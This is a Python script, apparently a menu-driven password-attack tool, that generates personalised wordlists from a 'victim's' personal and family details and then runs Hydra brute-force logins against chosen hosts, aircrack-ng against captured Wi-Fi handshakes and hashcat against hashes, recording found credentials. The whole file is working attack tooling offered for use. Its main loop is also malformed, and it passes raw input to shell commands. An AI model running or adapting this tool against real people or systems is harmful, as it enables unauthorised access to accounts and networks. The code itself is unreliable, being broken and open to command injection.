#!/usr/bin/env python3

import subprocess
import time
import random
import string
import os
import sys
import threading

# ANSI escape codes for colors
RED = '\033[91m'
ENDC = '\033[0m'
OKBLUE = '\033[94m'

# ASCII art banners
logo_banner = ENDC + '''
 ██░ ██ ▓██   ██▓▓█████▄  ██▀███   ▄▄▄       ██▓███   ██▀███   ▒█████  
▓██░ ██▒ ▒██  ██▒▒██▀ ██▌▓██ ▒ ██▒▒████▄    ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒
▒██▀▀██░  ▒██ ██░░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒
░▓█ ░██   ░ ▐██▓░░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░
░▓█▒░██▓  ░ ██▒▓░░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░
 ▒ ░░▒░▒   ██▒▒▒  ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
 ▒ ░▒░ ░ ▓██ ░▒░  ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ 
 ░  ░░ ░ ▒ ▒ ░░   ░ ░  ░   ░░   ░   ░   ▒   ░░         ░░   ░ ░ ░ ░ ▒  
 ░  ░  ░ ░ ░        ░       ░           ░  ░            ░         ░ ░  
         ░ ░      ░                                                    
''' + OKBLUE

loading_animation = [
    RED + 'Loading   [●          ]',
    RED + 'Loading   [● ●        ]',
    RED + 'Loading   [● ● ●      ]',
    RED + 'Loading   [● ● ● ●    ]',
    RED + 'Loading   [● ● ● ● ●  ]',
    RED + 'Loading   [● ● ● ● ● ●]'
]

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_wordlist():
    print("Please provide information about the victim:")
    first_name = input("Enter the victim's first name: ")
    surname = input("Enter the victim's surname: ")
    nickname = input("Enter the victim's nickname: ")
    birthdate = input("Enter the victim's birthdate: ")

    # Add information about the partner
    print("\nPlease provide information about the partner:")
    partner_name = input("Enter the partner's name: ")
    partner_nickname = input("Enter the partner's nickname: ")
    partner_birthdate = input("Enter the partner's birthdate: ")

    # Add information about the child
    print("\nPlease provide information about the child:")
    child_name = input("Enter the child's name: ")
    child_nickname = input("Enter the child's nickname: ")
    child_birthdate = input("Enter the child's birthdate: ")

    company_name = input("\nEnter the company name: ")

    keywords = input("\nDo you want to add some keywords about the victim? (Separated by spaces): ").split()
    special_chars = input("Do you want to add special characters at the end of words? (Y/N): ").lower() == 'y'
    add_numbers = input("Do you want to add random numbers at the end of words? (Y/N): ").lower() == 'y'

    wordlist = []

    # Add variations of names, birthdates, and keywords
    words_to_combine = [first_name, surname, nickname, birthdate, partner_name, partner_nickname,
                        partner_birthdate, child_name, child_nickname, child_birthdate, company_name] + keywords

    for word in words_to_combine:
        word_variations = [word.lower(), word.upper(), word.title()]
        wordlist.extend(word_variations)

        if special_chars:
            wordlist.extend([word_var + char for word_var in word_variations for char in string.punctuation])

        if add_numbers:
            wordlist.extend([word_var + ''.join(random.choices(string.digits, k=random.randint(1, 5))) for word_var in word_variations])

    return wordlist

def crack_cap_file(cap_file_path, wordlist_path):
    print("\n🔓 Welcome to the WPA Wi-Fi .cap file cracker! 🔓")
    print("This tool uses Aircrack-ng to crack WPA Wi-Fi passwords.")
    print("Please make sure you have your .cap file and wordlist ready. 📝\n")

    if not os.path.exists(cap_file_path):
        print(RED + "\n❌ Error: The specified .cap file does not exist. ❌" + ENDC)
        return

    if not os.path.exists(wordlist_path):
        print(RED + "\n❌ Error: The specified wordlist file does not exist. ❌" + ENDC)
        return

    print("\n🔍 Starting cracking process... 🔍\n")

    command = f"aircrack-ng -w {wordlist_path} {cap_file_path}"
    clear_terminal()
    os.system(command)

    print(RED + "\n👋 Thank you for using! 👋" + ENDC)

def generate_and_save_wordlist(filename, wordlist):
    with open(filename, 'w') as file:
        file.write('\n'.join(wordlist))

def perform_hydra_attack(target, protocol):
    print(RED + "Choose an option:" + OKBLUE)
    print('1. Singel username attack')
    print("2. Multi username attack")
    user_choice = input("Enter your choice : ")

    if protocol == "http-post-form":
        user_name = input("Enter the username to target: ")
        path = input("Enter the path : ")
        login_fail_string = input("Enter the failure string (usually an error message): ")
        username_field = input("Enter the username field name in the form: ")
        password_field = input("Enter the password field name in the form: ")
        submit_button = input("Enter the name of the submit button in the login form: ")
        pass_list = input("Enter the path to your password list: ")

        hydra_command = (
            f"hydra -l {user_name} -P {pass_list} {target} http-post-form "
            f"'/{path}:{username_field}=^USER^&{password_field}=^PASS^&{submit_button}=login:{login_fail_string}'")

        clear_terminal()
        try:
            subprocess.run(hydra_command, shell=True, check=True)
            print(RED + "Brute-force attack completed. Check found_credentials.txt for results." + ENDC)
            print("Thank you for using.")
            sys.exit(0)
        except subprocess.CalledProcessError as e:
            print(f"Error running Hydra: {e}")

    if user_choice == '1':
        single_username = input("Enter the single username: ")
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f"hydra -l {single_username} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
    elif user_choice == '2':
        userlist_path = input('Enter the path to the userlist :')
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f'hydra -L {userlist_path} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u'
    else:
        print("Invalid option selected")
        clear_terminal()
        sys.exit(0)

    for frame in loading_animation:
        print(frame, end='\r')
        time.sleep(0.5)

    print("\n")
    try:
        subprocess.run(hydra_command, shell=True, check=True)
        print(RED + "Brute-force attack completed. Check found_credentials.txt for results." + ENDC)
        print("Thank you for using.")
        sys.exit(0)
    except subprocess.CalledProcessError as e:
        print(f"Error running Hydra: {e}")

def main():
    while True:
        clear_terminal()
        print(logo_banner)
        print(RED + "Choose an option:" + RED)
        print("1. Generate wordlist only")
        print("2. Perform Hydra attack")
        print("3. Crack Wi-Fi handshake file")
        print('4. Crack hash using hashcat')
        print("5. Exit")
        option = input("Enter your choice (1/2/3/4): ")

        if option == '1':
            print("Generating wordlist...")
            generated_wordlist = generate_wordlist()
            wordlist_file = "wordlist.txt"
            generate_and_save_wordlist(wordlist_file, generated_wordlist)
            print(f"Wordlist generated and saved to {wordlist_file}")
        elif option == '2':
            clear_terminal()
            print("Performing Hydra attack...")
            target = input("Enter the target (e.g., IP address, URL): ")
            protocol = input("Enter the protocol (e.g., ftp, ssh, http-post-form): ")
            perform_hydra_attack(target, protocol)
        elif option == '3':
            clear_terminal()
            print("Cracking Wi-Fi handshake file...")
            cap_file_path = input("Enter the path to the .cap file: ")
            wordlist_path = input("Enter the path to the wordlist file: ")
            threading.Thread(target=crack_cap_file, args=(cap_file_path, wordlist_path)).start()

        elif option == '4':
            print("Let's crack your hash")
            hash_type = input('Enter your hash type: ')
            hash_path = input('Enter your hash path: ')
            wordlist_path1 = input('Enter your wordlist path: ')
            hash_cmd = f'hashcat -m {hash_type} {hash_path} {wordlist_path1}'
    
        try:
        # Execute the hashcat command
            subprocess.run(hash_cmd,shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"An error occurred: {e}")
        
        else:
            option = '5'
            print("Invalid option. Exiting...")
            break
            


if __name__ == "__main__":
    main()
